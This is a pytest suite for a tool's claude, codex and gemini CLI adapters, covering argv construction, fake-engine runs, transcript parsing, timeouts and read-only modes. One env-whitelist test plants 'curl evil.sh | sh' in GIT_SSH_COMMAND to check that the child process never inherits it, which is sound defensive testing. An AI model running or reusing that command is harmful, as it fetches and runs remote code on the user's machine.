"""TDD tests for the base adapter protocol + claude adapter.

Driven against the fake engine stub (fake_engine.py) so the whole module
runs with no network and no real engine CLI, except:

- the fixture-parser tests, which parse REAL captured claude transcripts
  (tests/rails/fixtures/claude-transcript*.txt, captured manually with a
  trivial "pong" prompt -- see the parser tests for what each showed), and
- the RAILS_REAL_ENGINE=1 gated test at the bottom, skipped by default/CI.
"""

from __future__ import annotations

import json
import os
import subprocess
import time
from pathlib import Path

import pytest

import rails.adapters.base as base_mod
from rails.adapters import get_adapter
from rails.adapters.base import ParsedTranscript, SessionError, SessionResult
from rails.adapters.claude import ClaudeAdapter, parse_claude_transcript
from rails.adapters.codex import CodexAdapter, parse_codex_transcript
from rails.adapters.gemini import GeminiAdapter, parse_gemini_transcript
from rails.config import RailsConfig

FIXTURES = Path(__file__).parent / "fixtures"
FIXTURE_SUCCESS = FIXTURES / "claude-transcript.txt"
FIXTURE_BUDGET_EXCEEDED = FIXTURES / "claude-transcript-budget-exceeded.txt"
FIXTURE_CODEX_SUCCESS = FIXTURES / "codex-transcript.txt"
FIXTURE_CODEX_ERROR = FIXTURES / "codex-transcript-error.txt"
FIXTURE_CODEX_OUT_FILE = FIXTURES / "codex-out-file.txt"
FIXTURE_GEMINI_SUCCESS = FIXTURES / "gemini-transcript.txt"
FIXTURE_GEMINI_ERROR = FIXTURES / "gemini-transcript-error.txt"
FIXTURE_GEMINI_MULTILINE = FIXTURES / "gemini-transcript-multiline.txt"

GEMINI_MULTILINE_EXPECTED = (
    "A dealer management system (DMS) is a software platform designed to help "
    "automotive, heavy equipment, or other dealerships manage their entire "
    "operations. It integrates various departments like sales, finance, parts, "
    "and service into a single system. A DMS streamlines workflows, improves "
    "efficiency, and provides comprehensive reporting for better decision-making."
)

ARGV_CWD = Path("/work/tree")
ARGV_OUT = Path("/work/tree/.rails-transcripts/run.out")


def make_config(**over) -> RailsConfig:
    defaults = {"engine": "claude", "max_budget_usd": 2.0, "repo_root": Path(".")}
    defaults.update(over)
    return RailsConfig(**defaults)


def stderr_sidecar(result: SessionResult) -> Path:
    """stderr goes to a sidecar log next to the .jsonl transcript."""
    return result.transcript_path.with_suffix(".stderr.log")


# --- build_argv: pure function ---------------------------------------------


def test_build_argv_exact():
    cfg = make_config(max_budget_usd=1.5)
    adapter = ClaudeAdapter(cfg, binary=["claude"])

    argv = adapter.build_argv("do the thing", cwd=ARGV_CWD, out_file=ARGV_OUT)

    # claude needs neither cwd (Popen sets it) nor out_file (stream-json on
    # stdout) -- both exist in the signature for the codex/gemini seam.
    assert argv == [
        "claude",
        "-p",
        "do the thing",
        "--setting-sources",
        "project,local",
        "--verbose",
        "--output-format",
        "stream-json",
        "--permission-mode",
        "acceptEdits",
        "--max-budget-usd",
        "1.5",
    ]


def test_build_argv_is_pure():
    adapter = ClaudeAdapter(make_config(), binary=["claude"])

    first = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)
    second = adapter.build_argv("hi", cwd=Path("/elsewhere"), out_file=Path("/elsewhere/o.out"))

    assert first == second  # no instance state mutated, no cwd/out_file leakage for claude


def test_build_argv_uses_custom_binary_override():
    cfg = make_config()
    adapter = ClaudeAdapter(cfg, binary=["uv", "run", "claude"])

    argv = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[:3] == ["uv", "run", "claude"]
    assert argv[3] == "-p"


def test_default_binary_is_bare_claude():
    cfg = make_config()
    adapter = ClaudeAdapter(cfg)

    assert adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)[0] == "claude"


# --- run(): fake-engine-driven behavior -------------------------------------


def test_run_ok_extracts_final_message_cost_and_transcript(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="ok")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert isinstance(result, SessionResult)
    assert result.engine == "claude"
    assert result.ok is True
    assert result.explicit_result is True
    assert result.raw_exit_code == 0
    assert result.final_message == "fake engine final message"
    assert result.cost_usd == pytest.approx(0.0123)
    assert result.duration_s > 0

    assert result.transcript_path.is_file()
    assert result.transcript_path.parent.name == ".rails-transcripts"
    contents = result.transcript_path.read_text()
    assert "fake engine final message" in contents
    assert '"total_cost_usd"' in contents


def test_run_fail_sets_ok_false_without_raising(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="fail")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is False
    assert result.raw_exit_code != 0


def test_stderr_captured_in_sidecar_transcript_stays_pure_jsonl(fake_binary, tmp_cwd):
    """stderr is captured to <transcript>.stderr.log so diagnostics survive,
    while the .jsonl transcript stays machine-parseable line by line."""
    argv, extra_env = fake_binary(shape="claude", behavior="fail")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    sidecar = stderr_sidecar(result)
    assert sidecar.is_file()
    assert "fake engine reporting failure" in sidecar.read_text()

    for line in result.transcript_path.read_text().splitlines():
        if line.strip():
            json.loads(line)  # every transcript line is valid JSON


def test_run_exit_zero_without_result_event_is_ok_but_not_explicit(fake_binary, tmp_cwd):
    """An engine stream that exits 0 but never emits its terminal result
    event (crash-adjacent truncation, or an engine that simply has no such
    event) keeps ok=True -- exit code semantics are unchanged -- but
    explicit_result=False flags that the engine never *said* it finished.
    Task 6's loop should treat ok and not explicit_result as suspicious."""
    argv, extra_env = fake_binary(shape="claude", behavior="ok_no_result")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    assert result.raw_exit_code == 0
    assert result.explicit_result is False
    # fallback path: final message comes from the last assistant text block
    assert result.final_message == "fake engine final message"


def test_engine_without_terminal_result_concept_never_flags_explicit_result(fake_binary, tmp_cwd):
    """For engines that have NO terminal-result event at all (gemini),
    emits_terminal_result=False makes explicit_result always True so Task
    6's 'ok and not explicit_result is suspicious' heuristic can never
    false-flag them."""

    class NoTerminalResultAdapter(ClaudeAdapter):
        name = "noterm"
        emits_terminal_result = False

    argv, extra_env = fake_binary(shape="gemini", behavior="ok")
    adapter = NoTerminalResultAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    assert result.explicit_result is True


def test_run_survives_non_utf8_bytes_mid_stream(fake_binary, tmp_cwd):
    """A raw non-UTF-8 byte (0xff) between a valid event and the terminal
    result event must not kill the capture: every line still lands in the
    transcript (decoded with errors="replace") and the result event after
    the noise still parses. Before the errors="replace" fix, the decode
    error killed the pump thread silently: empty transcript, ok=True."""
    argv, extra_env = fake_binary(shape="claude", behavior="bad_utf8")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    assert result.explicit_result is True
    assert result.final_message == "fake engine final message"
    assert result.cost_usd == pytest.approx(0.0123)

    contents = result.transcript_path.read_text()
    assert contents.strip() != ""
    assert '"total_cost_usd"' in contents  # the event AFTER the noise was captured
    assert "�" in contents  # the noise line was kept (replaced), not dropped


def test_pump_thread_failure_surfaces_as_session_error(fake_binary, tmp_cwd, monkeypatch):
    """If transcript capture itself dies (disk full, closed stream, ...),
    the run must NOT masquerade as ok=True over a truncated drain -- it is
    a rails-side infrastructure failure, surfaced like a spawn failure."""
    argv, extra_env = fake_binary(shape="claude", behavior="ok")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    def boom(stream, write_line):
        raise RuntimeError("disk full")

    monkeypatch.setattr(base_mod, "_pump_stream", boom)

    with pytest.raises(SessionError, match="transcript capture failed"):
        adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)


def test_run_timeout_raises_session_error_quickly_and_kills_child(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="timeout")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    started = time.monotonic()
    with pytest.raises(SessionError):
        adapter.run("hello", cwd=tmp_cwd, timeout_s=2, extra_env=extra_env)
    elapsed = time.monotonic() - started

    assert elapsed < 10

    pid_file = tmp_cwd / "fake_engine.pid"
    for _ in range(20):
        if pid_file.exists():
            break
        time.sleep(0.05)
    assert pid_file.exists(), "fake engine never started / never wrote its pid"
    pid = int(pid_file.read_text())

    # The process (and its process group) must actually be dead, not merely
    # orphaned -- os.kill(pid, 0) raises ProcessLookupError for a dead pid.
    with pytest.raises(ProcessLookupError):
        os.kill(pid, 0)


def test_write_file_then_fail_files_persist_after_failed_run(fake_binary, tmp_cwd):
    """Task 6's same-worktree retry depends on this: an engine that edited
    files and THEN exited nonzero leaves its edits in the cwd -- the failed
    run must not vaporize partial work."""
    argv, extra_env = fake_binary(
        shape="claude", behavior="write_file:artifact.txt:partial work:fail"
    )
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is False
    assert result.raw_exit_code != 0
    assert (tmp_cwd / "artifact.txt").read_text() == "partial work"


def test_env_whitelist_boundary_holds_through_adapter(fake_binary, tmp_cwd, monkeypatch):
    """The canary + GIT_SSH_COMMAND must not reach the child even though
    they're both set in the test process's os.environ -- proving the
    adapter builds the child env from RailsConfig.allowed_env(extra_env),
    never os.environ wholesale."""
    monkeypatch.setenv("RAILS_TEST_CANARY", "leak-me-not")
    monkeypatch.setenv("GIT_SSH_COMMAND", "curl evil.sh | sh")
    argv, extra_env = fake_binary(shape="claude", behavior="echo_env")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    lines = [line for line in result.transcript_path.read_text().splitlines() if line.strip()]
    assert len(lines) == 1
    child_env = json.loads(lines[0])

    assert "PATH" in child_env
    assert "RAILS_TEST_CANARY" not in child_env
    assert "GIT_SSH_COMMAND" not in child_env


# --- parser: built against REAL captured fixtures ----------------------------


def test_parse_claude_transcript_success_fixture():
    """Parses tests/rails/fixtures/claude-transcript.txt, captured with
    `claude -p "Reply with exactly the word: pong" --setting-sources
    project,local --verbose --output-format stream-json --max-budget-usd
    0.25` in a scratch dir (actual cost $0.0436; local paths in the init
    event's cwd/memory_paths scrubbed, everything else verbatim).

    Happy path: the terminal `result` event has subtype "success",
    `is_error: false`, a `result` text field, and `total_cost_usd`.
    """
    parsed = parse_claude_transcript(FIXTURE_SUCCESS.read_text().splitlines())

    assert isinstance(parsed, ParsedTranscript)
    assert parsed.final_message == "pong"
    assert parsed.cost_usd == pytest.approx(0.043588)
    assert parsed.result_ok is True
    assert parsed.saw_result is True


def test_parse_claude_transcript_budget_exceeded_fixture():
    """Parses tests/rails/fixtures/claude-transcript-budget-exceeded.txt --
    hand-trimmed from an earlier real capture whose run hit its $0.05 budget
    cap mid-stream: the terminal `result` event has subtype
    "error_max_budget_usd", `is_error: true`, and NO `result` text field at
    all -- the model had already said "pong" in an `assistant` text block
    before the budget check fired. This pins the fallback path the parser
    contract describes ("fallback: last assistant text event").
    """
    parsed = parse_claude_transcript(FIXTURE_BUDGET_EXCEEDED.read_text().splitlines())

    assert parsed.final_message == "pong"  # fallback: from the assistant event, not `result`
    assert parsed.cost_usd == pytest.approx(0.202691)
    assert parsed.result_ok is False  # is_error: true on the real result event
    assert parsed.saw_result is True


def test_parse_claude_transcript_no_result_event():
    lines = [
        json.dumps(
            {"type": "assistant", "message": {"content": [{"type": "text", "text": "partial"}]}}
        )
    ]

    parsed = parse_claude_transcript(lines)

    assert parsed.final_message == "partial"
    assert parsed.cost_usd is None
    assert parsed.result_ok is True  # no result event seen -- exit code alone decides ok
    assert parsed.saw_result is False


# --- codex adapter: build_argv (pure) ---------------------------------------


def test_codex_build_argv_exact():
    cfg = make_config()
    adapter = CodexAdapter(cfg, binary=["codex"])

    argv = adapter.build_argv("do the thing", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv == [
        "codex",
        "exec",
        "-s",
        "workspace-write",
        "--json",
        "--ignore-user-config",
        "-C",
        str(ARGV_CWD),
        "-o",
        str(ARGV_OUT),
        "do the thing",
    ]
    # prompt is the trailing POSITIONAL arg -- codex's -p means --profile,
    # NOT "prompt". Using -p here would silently misroute the prompt text
    # into a config-profile lookup instead of driving the session.
    assert "-p" not in argv
    assert argv[-1] == "do the thing"  # positional, not attached to any flag


def test_codex_build_argv_wires_cwd_and_out_file():
    adapter = CodexAdapter(make_config(), binary=["codex"])
    other_cwd = Path("/elsewhere")
    other_out = Path("/elsewhere/.rails-transcripts/run.out")

    argv = adapter.build_argv("hi", cwd=other_cwd, out_file=other_out)

    assert argv[argv.index("-C") + 1] == str(other_cwd)
    assert argv[argv.index("-o") + 1] == str(other_out)


def test_codex_build_argv_is_pure_given_same_inputs():
    adapter = CodexAdapter(make_config(), binary=["codex"])

    first = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)
    second = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert first == second  # no instance-state mutation


def test_codex_build_argv_uses_custom_binary_override():
    adapter = CodexAdapter(make_config(), binary=["uv", "run", "codex"])

    argv = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[:3] == ["uv", "run", "codex"]
    assert argv[3] == "exec"


def test_codex_default_binary_is_bare_codex():
    adapter = CodexAdapter(make_config())

    assert adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)[0] == "codex"


# --- codex adapter: run() (fake-engine-driven) -------------------------------


def test_codex_run_ok_reads_out_file_for_final_message(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="codex", behavior="ok")
    adapter = CodexAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.engine == "codex"
    assert result.ok is True
    assert result.explicit_result is True  # turn.completed was seen
    assert result.raw_exit_code == 0
    assert result.final_message == "fake engine final message"
    # codex reports token counts, not USD -- cost_usd is tolerated as None.
    assert result.cost_usd is None
    assert result.transcript_path.is_file()


def test_codex_run_fail_sets_ok_false_and_no_out_file(fake_binary, tmp_cwd):
    """Real codex only writes the -o file on a successful turn (verified by
    a real capture with a bogus model: no out.txt at all on failure) -- the
    fake engine mirrors that, so a failed run must fall back to the
    in-stream agent_message (there's none here, so final_message is empty)
    rather than crash trying to read a file that was never created."""
    argv, extra_env = fake_binary(shape="codex", behavior="fail")
    adapter = CodexAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is False
    assert result.raw_exit_code != 0
    assert result.explicit_result is True  # turn.failed is still a terminal event


# --- codex adapter: parser, built against REAL captured fixtures ------------


def test_parse_codex_transcript_success_fixture():
    """Parses tests/rails/fixtures/codex-transcript.txt, captured with
    `codex exec -s workspace-write --json --ignore-user-config -C <dir> -o
    <dir>/out.txt "Reply with exactly the word: pong"` (codex-cli 0.141.0).
    The stream carries thread.started / turn.started / item.completed
    (agent_message) / turn.completed (usage, no cost). The real -o file held
    exactly "pong" (no trailing newline) -- that's the reliable source,
    verified to win over the in-stream agent_message text.
    """
    parsed = parse_codex_transcript(
        FIXTURE_CODEX_SUCCESS.read_text().splitlines(),
        out_file=FIXTURE_CODEX_OUT_FILE,
    )

    assert isinstance(parsed, ParsedTranscript)
    assert parsed.final_message == "pong"
    assert parsed.cost_usd is None
    assert parsed.result_ok is True
    assert parsed.saw_result is True


def test_parse_codex_transcript_missing_out_file_falls_back_to_stream():
    """When the -o file doesn't exist (real codex skips writing it on
    failure), fall back to the last agent_message text seen in-stream."""
    parsed = parse_codex_transcript(
        FIXTURE_CODEX_SUCCESS.read_text().splitlines(),
        out_file=FIXTURES / "does-not-exist.out",
    )

    assert parsed.final_message == "pong"  # from the item.completed agent_message


def test_parse_codex_transcript_error_fixture():
    """Parses tests/rails/fixtures/codex-transcript-error.txt, captured with
    a bogus -m model value: thread.started, an item.completed error item, a
    mid-stream top-level `error` event, then the terminal `turn.failed`
    event carrying the real error payload. No -o file was written at all on
    this run (verified separately) -- result_ok comes from turn.failed.
    """
    parsed = parse_codex_transcript(
        FIXTURE_CODEX_ERROR.read_text().splitlines(),
        out_file=FIXTURES / "does-not-exist.out",
    )

    assert parsed.result_ok is False
    assert parsed.saw_result is True


def test_parse_codex_transcript_no_terminal_event():
    lines = [
        json.dumps({"type": "item.completed", "item": {"type": "agent_message", "text": "partial"}})
    ]

    parsed = parse_codex_transcript(lines, out_file=FIXTURES / "does-not-exist.out")

    assert parsed.final_message == "partial"
    assert parsed.result_ok is True  # no terminal event seen -- exit code alone decides
    assert parsed.saw_result is False


# --- gemini adapter: build_argv (pure) ---------------------------------------


def test_gemini_build_argv_exact():
    adapter = GeminiAdapter(make_config(), binary=["gemini"])

    argv = adapter.build_argv("do the thing", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv == [
        "gemini",
        "-p",
        "do the thing",
        "--approval-mode",
        "auto_edit",
        "-o",
        "stream-json",
    ]
    # gemini's -o is the OUTPUT FORMAT selector, not a file path -- out_file
    # must never leak into gemini's argv.
    assert str(ARGV_OUT) not in argv


def test_gemini_build_argv_ignores_cwd_and_out_file():
    adapter = GeminiAdapter(make_config(), binary=["gemini"])

    first = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)
    second = adapter.build_argv("hi", cwd=Path("/elsewhere"), out_file=Path("/elsewhere/o.out"))

    assert first == second


def test_gemini_build_argv_uses_custom_binary_override():
    adapter = GeminiAdapter(make_config(), binary=["uv", "run", "gemini"])

    argv = adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[:3] == ["uv", "run", "gemini"]
    assert argv[3] == "-p"


def test_gemini_default_binary_is_bare_gemini():
    adapter = GeminiAdapter(make_config())

    assert adapter.build_argv("hi", cwd=ARGV_CWD, out_file=ARGV_OUT)[0] == "gemini"


# --- gemini adapter: run() (fake-engine-driven) -------------------------------


def test_gemini_run_ok_extracts_best_effort_final_message(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="gemini", behavior="ok")
    adapter = GeminiAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.engine == "gemini"
    assert result.ok is True
    assert result.final_message == "fake engine final message"
    assert result.cost_usd is None


def test_gemini_explicit_result_always_true_even_on_failure(fake_binary, tmp_cwd):
    """gemini has no reliable terminal-result event (emits_terminal_result =
    False), so explicit_result is pinned True regardless of ok, per the base
    seam's "engines with no terminal-result concept never false-flag"
    contract -- proven here for BOTH the ok and the fail path."""
    ok_argv, ok_env = fake_binary(shape="gemini", behavior="ok")
    ok_adapter = GeminiAdapter(make_config(), binary=ok_argv)
    ok_result = ok_adapter.run("hello", cwd=tmp_cwd, extra_env=ok_env)
    assert ok_result.explicit_result is True

    fail_argv, fail_env = fake_binary(shape="gemini", behavior="fail")
    fail_adapter = GeminiAdapter(make_config(), binary=fail_argv)
    fail_result = fail_adapter.run("hello", cwd=tmp_cwd, extra_env=fail_env)
    assert fail_result.ok is False
    assert fail_result.explicit_result is True


# --- gemini adapter: parser, built against REAL captured fixtures -----------


def test_parse_gemini_transcript_success_fixture():
    """Parses tests/rails/fixtures/gemini-transcript.txt, captured with
    `gemini -p "Reply with exactly the word: pong" --approval-mode auto_edit
    -o stream-json` (gemini 0.29.5): init / message(role=user) /
    message(role=assistant, content="pong") / a terminal `result` event.
    The parser deliberately ignores the `result` event's content (best
    effort only, see GeminiAdapter.emits_terminal_result) and reads the
    assistant message text instead.
    """
    parsed = parse_gemini_transcript(FIXTURE_GEMINI_SUCCESS.read_text().splitlines())

    assert isinstance(parsed, ParsedTranscript)
    assert parsed.final_message == "pong"
    assert parsed.cost_usd is None
    assert parsed.saw_result is False  # never trusted as authoritative, see module docstring


def test_parse_gemini_transcript_multiline_accumulates_delta_fragments():
    """Parses tests/rails/fixtures/gemini-transcript-multiline.txt, a REAL
    capture with a multi-sentence reply that streams as TWO assistant
    `message` events, both `delta:true`. Observed semantics (gemini 0.29.5):
    delta fragments are INCREMENTAL -- the second event's content starts
    "... like sales, finance ..." (a continuation), NOT a cumulative repeat
    of the first. The parser must CONCATENATE them in order; a "last wins"
    parser would truncate the answer to just the second sentence-and-a-half.
    """
    parsed = parse_gemini_transcript(FIXTURE_GEMINI_MULTILINE.read_text().splitlines())

    assert parsed.final_message == GEMINI_MULTILINE_EXPECTED
    # sanity: both fragments made it in, nothing dropped
    assert parsed.final_message.startswith("A dealer management system")
    assert parsed.final_message.endswith("better decision-making.")
    assert "like sales, finance, parts" in parsed.final_message


def test_parse_gemini_transcript_error_fixture_does_not_raise():
    """Parses tests/rails/fixtures/gemini-transcript-error.txt (a real
    capture with a bogus -m model value): init / message(user) / a terminal
    `result` event with status "error" and no assistant text at all. No
    assistant message means final_message falls back to the last non-empty
    raw stdout line -- degrade gracefully, never raise."""
    parsed = parse_gemini_transcript(FIXTURE_GEMINI_ERROR.read_text().splitlines())

    assert parsed.saw_result is False
    assert parsed.result_ok is True  # never downgraded by parsing -- exit code alone decides
    assert parsed.final_message != ""  # fell back to the raw result line, didn't crash/blank out


def test_parse_gemini_transcript_tolerates_garbage_never_raises():
    lines = ["not json at all", "", "   ", "{broken json", "last non-empty line"]

    parsed = parse_gemini_transcript(lines)

    assert parsed.final_message == "last non-empty line"
    assert parsed.cost_usd is None
    assert parsed.result_ok is True
    assert parsed.saw_result is False


def test_parse_gemini_transcript_empty_input_never_raises():
    parsed = parse_gemini_transcript([])

    assert parsed.final_message == ""
    assert parsed.result_ok is True
    assert parsed.saw_result is False


# --- registry ------------------------------------------------------------


def test_get_adapter_returns_claude_adapter():
    adapter = get_adapter("claude", make_config())
    assert isinstance(adapter, ClaudeAdapter)


def test_get_adapter_returns_codex_adapter():
    adapter = get_adapter("codex", make_config())
    assert isinstance(adapter, CodexAdapter)


def test_get_adapter_returns_gemini_adapter():
    adapter = get_adapter("gemini", make_config())
    assert isinstance(adapter, GeminiAdapter)


def test_get_adapter_unknown_engine_raises_value_error():
    with pytest.raises(ValueError, match="unknown engine"):
        get_adapter("chatgpt", make_config())


def test_get_adapter_passes_binary_override_through():
    adapter = get_adapter("codex", make_config(), binary=["uv", "run", "codex"])
    assert adapter.binary == ["uv", "run", "codex"]


def test_get_adapter_defaults_readonly_false():
    adapter = get_adapter("claude", make_config())
    assert adapter.readonly is False


def test_get_adapter_threads_readonly_through():
    adapter = get_adapter("codex", make_config(), readonly=True)
    assert adapter.readonly is True


# --- readonly build_argv (I3): reviewer sessions must not be able to write ---


def test_claude_readonly_build_argv_uses_plan_not_acceptedits():
    adapter = ClaudeAdapter(make_config(), binary=["claude"], readonly=True)

    argv = adapter.build_argv("review this", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert "plan" in argv
    assert "acceptEdits" not in argv
    # the read-only mode is the value of --permission-mode
    assert argv[argv.index("--permission-mode") + 1] == "plan"


def test_claude_write_build_argv_uses_acceptedits_not_plan():
    adapter = ClaudeAdapter(make_config(), binary=["claude"], readonly=False)

    argv = adapter.build_argv("build this", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[argv.index("--permission-mode") + 1] == "acceptEdits"
    assert "plan" not in argv


def test_codex_readonly_build_argv_uses_read_only_sandbox():
    adapter = CodexAdapter(make_config(), binary=["codex"], readonly=True)

    argv = adapter.build_argv("review this", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[argv.index("-s") + 1] == "read-only"
    assert "workspace-write" not in argv


def test_codex_write_build_argv_uses_workspace_write_sandbox():
    adapter = CodexAdapter(make_config(), binary=["codex"], readonly=False)

    argv = adapter.build_argv("build this", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[argv.index("-s") + 1] == "workspace-write"
    assert "read-only" not in argv


def test_gemini_readonly_build_argv_uses_default_approval_mode():
    adapter = GeminiAdapter(make_config(), binary=["gemini"], readonly=True)

    argv = adapter.build_argv("review this", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[argv.index("--approval-mode") + 1] == "default"
    assert "auto_edit" not in argv


def test_gemini_write_build_argv_uses_auto_edit_approval_mode():
    adapter = GeminiAdapter(make_config(), binary=["gemini"], readonly=False)

    argv = adapter.build_argv("build this", cwd=ARGV_CWD, out_file=ARGV_OUT)

    assert argv[argv.index("--approval-mode") + 1] == "auto_edit"
    assert "default" not in argv


# --- A1: KeyboardInterrupt during a live session kills the process group -----


def test_keyboardinterrupt_during_session_kills_process_group(fake_binary, tmp_cwd, monkeypatch):
    """Ctrl-C mid-session must NOT orphan a running engine child burning
    subscription quota: the base run() catches KeyboardInterrupt during
    proc.wait(), kills the whole process group, then re-raises."""
    argv, extra_env = fake_binary(shape="claude", behavior="timeout")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    real_wait = subprocess.Popen.wait
    state = {"interrupted": False}

    def fake_wait(self, timeout=None):
        # On the FIRST timed wait (run()'s proc.wait(timeout=timeout_s)), let
        # the child actually start + write its pid so we can verify the group
        # got killed, then simulate the operator's Ctrl-C. The handler's own
        # untimed proc.wait() reaps normally via the real implementation.
        if not state["interrupted"] and timeout is not None:
            for _ in range(100):
                if (tmp_cwd / "fake_engine.pid").exists():
                    break
                time.sleep(0.05)
            state["interrupted"] = True
            raise KeyboardInterrupt
        return real_wait(self, timeout=timeout)

    monkeypatch.setattr(subprocess.Popen, "wait", fake_wait)

    with pytest.raises(KeyboardInterrupt):
        adapter.run("hello", cwd=tmp_cwd, timeout_s=30, extra_env=extra_env)

    pid_file = tmp_cwd / "fake_engine.pid"
    assert pid_file.exists(), "fake engine never started / never wrote its pid"
    pid = int(pid_file.read_text())

    # The process (and its group) must be dead, not merely orphaned.
    for _ in range(40):
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            break
        time.sleep(0.05)
    with pytest.raises(ProcessLookupError):
        os.kill(pid, 0)


def test_session_error_carries_transcript_path_on_timeout(fake_binary, tmp_cwd):
    """C2 support: a SessionError from a timeout carries the partial
    transcript path so the loop can tell the operator what to inspect."""
    argv, extra_env = fake_binary(shape="claude", behavior="timeout")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    with pytest.raises(SessionError) as excinfo:
        adapter.run("hello", cwd=tmp_cwd, timeout_s=2, extra_env=extra_env)

    assert excinfo.value.transcript_path is not None
    assert excinfo.value.transcript_path.parent.name == ".rails-transcripts"


# --- gated real-engine tests --------------------------------------------------


@pytest.mark.skipif(
    os.environ.get("RAILS_REAL_ENGINE") != "1",
    reason="real engine run (spends real subscription budget) -- set RAILS_REAL_ENGINE=1 to run",
)
def test_real_claude_engine_says_pong(tmp_path):
    adapter = ClaudeAdapter(make_config(max_budget_usd=0.05))

    result = adapter.run("Reply with exactly the word: pong", cwd=tmp_path, timeout_s=60)

    assert "pong" in result.final_message.lower()


@pytest.mark.skipif(
    os.environ.get("RAILS_REAL_ENGINE") != "1",
    reason="real engine run (spends real subscription budget) -- set RAILS_REAL_ENGINE=1 to run",
)
def test_real_codex_engine_says_pong(tmp_path):
    # codex requires a trusted git repo (or --skip-git-repo-check) to run
    # non-interactively -- tmp_path is not a repo, so make it one.
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "--allow-empty", "-m", "init"], cwd=tmp_path, check=True)

    adapter = CodexAdapter(make_config())

    result = adapter.run("Reply with exactly the word: pong", cwd=tmp_path, timeout_s=60)

    assert "pong" in result.final_message.lower()


@pytest.mark.skipif(
    os.environ.get("RAILS_REAL_ENGINE") != "1",
    reason="real engine run (spends real subscription budget) -- set RAILS_REAL_ENGINE=1 to run",
)
def test_real_gemini_engine_says_pong(tmp_path):
    adapter = GeminiAdapter(make_config())

    result = adapter.run("Reply with exactly the word: pong", cwd=tmp_path, timeout_s=60)

    assert "pong" in result.final_message.lower()
